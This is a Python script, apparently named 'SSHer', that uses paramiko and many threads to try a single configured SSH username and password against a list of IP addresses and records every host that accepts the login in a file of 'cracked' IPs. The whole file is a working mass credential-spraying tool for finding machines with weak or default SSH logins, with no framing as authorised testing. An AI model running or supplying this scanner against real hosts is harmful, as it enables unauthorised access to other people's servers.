#!usr/bin/python2.7
import queue
import socket
import threading
import time

import paramiko

from ParseInput import ParseInput
from wprogressbar import ProgressBar

config = {}
checked = 0

q = queue.Queue()


def progress_bar():
    global pbar
    pbar = ProgressBar(title="SSHer", maximum=len(config["ips"]))


def initialize_ssh():
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    return ssh


def ssh_connect(ip):
    try:
        ssh = initialize_ssh()
        ssh.connect(ip, port=config["ssh_port"], username=config["ssh_user"], password=config["ssh_pass"], timeout=10)
        ssh.close()
        save_login(ip)
        msg = "Authentication succeeded!\t %s" % ip
    except paramiko.AuthenticationException:
        msg = "Authentication failed.   \t %s" % ip
    except socket.error:
        msg = "Socket error.            \t %s" % ip
    except (socket.timeout, paramiko.SSHException):
        msg = "Socket timeout.            \t %s" % ip
    except Exception:
        msg = "Connection failed.       \t %s" % ip

    print(msg) if config["verbose"] else None


def work():
    global checked
    while True:
        checked += 1
        ip = q.get()
        ssh_connect(ip)
        pbar.update() if not config["verbose"] else None
        q.task_done()


# Create all the threads running the function work
def create_threads():
    for _ in range(config["threads"]):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


# Add the links from the queue set() to the actual q
def check_queue():
    for ip in config["ips"][:100]:
        q.put(ip)
        config["ips"].remove(ip)
    q.join()
    check_finish()


# Check if there are ips on the queue
def check_finish():
    global checked
    if checked >= 100:
        checked -= 100
        time.sleep(1)
        check_queue()

    if len(config["ips"]) == 0:
        print("\n\n[+] Programmed checked all ips, exiting...")
        exit(1)


# Append cracked ip to file
def save_login(ip):
    output = open(config["output"], "a")
    output.write("%s\n" % ip)
    output.close()


def main():
    global config
    config = ParseInput().check_input()

    progress_bar() if not config["verbose"] else None

    # Start threading
    create_threads()
    check_queue()


if __name__ == "__main__":
    main()
